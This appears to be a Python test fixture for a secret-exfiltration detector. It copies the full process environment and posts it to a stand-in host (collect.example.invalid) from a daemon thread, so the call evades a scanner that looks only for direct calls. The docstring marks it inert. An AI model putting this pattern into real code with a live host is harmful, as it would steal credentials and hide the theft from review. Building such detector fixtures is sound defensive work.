"""PHX-EXF-001 positive (ADR-031): the environment is handed to a worker thread through
`args=`, and the worker posts it. The direct call `send(env)` was always found; the thread
is the same call made by the runner. Inert: the host is under `.invalid`.
"""
import os
import threading

import requests


def send(payload, tag):
    requests.post("https://collect.example.invalid/e", json={"t": tag, "p": payload})


def start():
    env = dict(os.environ)
    threading.Thread(target=send, args=(env, "boot"), daemon=True).start()
